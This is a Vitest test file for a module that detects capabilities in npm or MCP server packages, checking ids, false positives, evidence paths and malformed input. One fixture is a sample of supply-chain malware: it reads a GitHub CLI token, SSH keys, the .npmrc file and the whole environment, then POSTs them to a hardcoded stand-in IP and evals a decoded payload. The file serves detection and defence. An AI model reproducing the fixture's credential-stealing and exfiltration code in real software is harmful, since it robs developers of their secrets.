import { describe, it, expect } from "vitest";
import { detectCapabilities, CAPABILITIES } from "../server/lib/capabilities.js";

/**
 * Capability detection is deliberately a different kind of signal from threat
 * detection. Threats accuse; capabilities describe.
 *
 * "This server can read your filesystem and make network calls" is a fact a
 * buyer needs before an agent runs it with their permissions — not a charge
 * against the author. That is why this layer can carry many signals safely:
 * a misfiring threat pattern defames a maintainer, a misfiring capability
 * merely over-describes a package.
 *
 * Indicators are drawn from published research rather than invented:
 * OWASP's MCP Security Cheat Sheet, Unit 42's npm threat landscape, Equixly's
 * MCP scan, and the Invariant Labs tool-poisoning disclosure.
 */
describe("capability detection", () => {
  it("every capability has a stable id, label, group and at least one pattern", () => {
    for (const c of CAPABILITIES) {
      // Digits are allowed: "exfil_p2p" is the clearest name for that channel.
      expect(c.id, JSON.stringify(c)).toMatch(/^[a-z]+_[a-z0-9_]+$/);
      expect(c.label.length).toBeGreaterThan(4);
      expect(c.group.length).toBeGreaterThan(2);
      expect(c.res.length).toBeGreaterThan(0);
    }
  });

  it("capability ids are unique", () => {
    const ids = CAPABILITIES.map((c) => c.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it("no pattern carries the /g flag — lastIndex would leak between files", () => {
    // A stateful regex reused across files silently skips matches.
    for (const c of CAPABILITIES) {
      for (const re of c.res) expect(re.flags, c.id).not.toContain("g");
    }
  });

  describe("recognises real malware behaviour", () => {
    // Every indicator below is documented in Unit 42's analysis of live npm
    // supply-chain malware, not invented for this test.
    const malware = [{ path: "setup.mjs", text: `
      const _0x3865d8 = require('child_process');
      const t = _0x3865d8.execSync('gh auth token').toString();
      const env = JSON.stringify(process.env);
      const key = fs.readFileSync(os.homedir()+'/.ssh/id_rsa');
      const npmrc = fs.readFileSync(os.homedir()+'/.npmrc');
      if (process.env.LC_ALL === 'ru') process.exit(0);
      fetch('https://192.0.2.1/api/v1/beacon', { method:'POST', body: env });
      eval(atob(payload));
    ` }];
    const found = detectCapabilities(malware);
    const ids = found.capabilities.map((c) => c.id);

    it.each([
      ["cred_gh_cli", "steals a token via the GitHub CLI"],
      ["cred_env_bulk", "serialises the whole environment"],
      ["cred_ssh_keys", "reads an SSH private key"],
      ["cred_npm_token", "reads the npm token used to self-publish"],
      ["obfus_hex_identifiers", "mangled _0x… identifiers"],
      ["anti_locale_check", "locale killswitch"],
      ["net_hardcoded_ip", "hardcoded C2 address"],
      ["obfus_encoded", "atob-decoded payload"],
      ["proc_dynamic_code", "eval of the decoded payload"],
    ])("detects %s — %s", (id) => {
      expect(ids).toContain(id);
    });

    it("reports it as heavily sensitive", () => {
      expect(found.sensitive_count).toBeGreaterThanOrEqual(8);
    });
  });

  describe("stays quiet on an ordinary server", () => {
    const benign = detectCapabilities([{ path: "index.js", text: `
      import { readFileSync } from "node:fs";
      const key = process.env.MY_API_KEY;
      export async function get(url) { return fetch(url); }
    ` }]);

    it("reports only what the code actually does", () => {
      const ids = benign.capabilities.map((c) => c.id);
      expect(ids).toContain("net_http");
      expect(ids).toContain("fs_read");
      expect(ids).toContain("cred_env_read");
    });

    it("does not claim credential theft, obfuscation or persistence", () => {
      const ids = benign.capabilities.map((c) => c.id);
      for (const absent of [
        "cred_env_bulk", "cred_ssh_keys", "cred_gh_cli",
        "obfus_hex_identifiers", "anti_locale_check", "persist_autostart",
        "exfil_p2p", "exfil_webhook",
      ]) {
        expect(ids, `false positive: ${absent}`).not.toContain(absent);
      }
    });

    it("keeps the sensitive count low", () => {
      expect(benign.sensitive_count).toBeLessThanOrEqual(2);
    });
  });

  it("names the file that evidences each capability, so a claim can be checked", () => {
    const r = detectCapabilities([
      { path: "a.js", text: "const x = 1;" },
      { path: "danger.js", text: "require('child_process')" },
    ]);
    const shell = r.capabilities.find((c) => c.id === "proc_shell");
    expect(shell.evidence_path).toBe("danger.js");
  });

  it("returns nothing for empty or malformed input rather than throwing", () => {
    expect(detectCapabilities([]).capabilities).toHaveLength(0);
    expect(detectCapabilities(null).capabilities).toHaveLength(0);
    expect(detectCapabilities([{ path: undefined, text: null }, {}]).capabilities).toHaveLength(0);
  });

  it("is a description, not a verdict — it never returns a score", () => {
    // The whole point of this layer: facts carry no penalty.
    const r = detectCapabilities([{ path: "x.js", text: "require('child_process')" }]);
    expect(r).not.toHaveProperty("score");
    expect(r).not.toHaveProperty("tier");
    expect(r).not.toHaveProperty("penalty");
  });
});
